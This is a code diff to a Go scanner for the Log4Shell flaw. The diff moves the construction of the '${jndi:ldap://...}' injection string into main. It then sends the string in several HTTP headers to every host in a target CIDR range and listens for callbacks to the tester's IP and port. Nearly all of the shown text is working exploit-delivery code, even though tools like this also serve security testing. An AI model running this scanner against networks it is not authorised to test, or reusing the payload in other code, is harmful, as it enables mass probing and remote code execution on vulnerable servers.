@@ -50,33 +50,25 @@ func increment(ip net.IP) {
 	}
 }
 
-func request(urls []string, sourceIp string, sourcePort string) error {
+func request(url string, payload string) error {
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return fmt.Errorf("Got error %s", err.Error())
+	}
+	// Poison a whole bunch
+	req.Header.Set("User-Agent", payload)
+	req.Header.Add("X-Api-Version", payload)
+	req.Header.Add("Bearer", payload)
+	req.Header.Add("Authentication", payload)
+	//log.Printf("Testing %v", req)
 	client := &http.Client{
 		Timeout: time.Millisecond * 50,
 	}
-
-	for _, url := range urls {
-		req, err := http.NewRequest("GET", url, nil)
-		if err != nil {
-			return fmt.Errorf("Got error %s", err.Error())
-		}
-		var lh string = "${jndi:ldap:"
-		var rh string = "blu}"
-		var payload string = fmt.Sprintf("%v//%v:%v/%v", lh, sourceIp, sourcePort, rh)
-		// Poison a whole bunch
-		req.Header.Set("User-Agent", payload)
-		req.Header.Add("X-Api-Version", payload)
-		req.Header.Add("Bearer", payload)
-		req.Header.Add("Authentication", payload)
-		//log.Printf("Testing %v", req)
-		response, err := client.Do(req)
-		if err != nil {
-			// log.Printf("Got error %v", err.Error())
-			continue
-		}
-		defer response.Body.Close()
+	response, err := client.Do(req)
+	if err != nil {
+		return err
 	}
-	log.Printf("Completed scanning of provided CIDR, leaving connection open for later callbacks. You should ctrl+c this program once final callbacks have landed.\n---------")
+	defer response.Body.Close()
 	return nil
 }
 
@@ -108,9 +100,11 @@ func main() {
 		log.Printf("Ensure your properly structured your cidr, e.g., 192.168.1.0/24")
 		os.Exit(1)
 	}
+	payload := "${jndi:ldap://" + sourceIp + ":" + sourcePort + "/blu}"
 	log.Printf("Running configuration based on input:")
 	log.Printf("Source/Callback IP: %v", sourceIp)
 	log.Printf("Source/Callback Port: %v", sourcePort)
+	log.Printf("Payload: %v", payload)
 	log.Printf("Target CIDR: %v", destCIDR)
 	log.Printf("Target Port: %v", destPort)
 
@@ -120,17 +114,19 @@ func main() {
 		log.Printf("Error listening: %v", err.Error())
 		os.Exit(1)
 	}
-
-	// Close the listener when the application closes.
 	defer l.Close()
-
 	log.Printf("Listening on " + sourceIp + ":" + sourcePort + "\n---------")
+
 	urls, err := urlsCIDR(destCIDR, destPort)
 	if err != nil {
 		log.Fatal(err)
 	}
 	log.Printf("Scanning %v CIDR now!\n---------", destCIDR)
-	request(urls, sourceIp, sourcePort)
+	for _, url := range urls {
+		request(url, payload)
+	}
+
+	log.Printf("Completed scanning of provided CIDR, leaving connection open for later callbacks. You should ctrl+c this program once final callbacks have landed.\n---------")
 	for {
 		// Listen for an incoming connection.
 		conn, err := l.Accept()
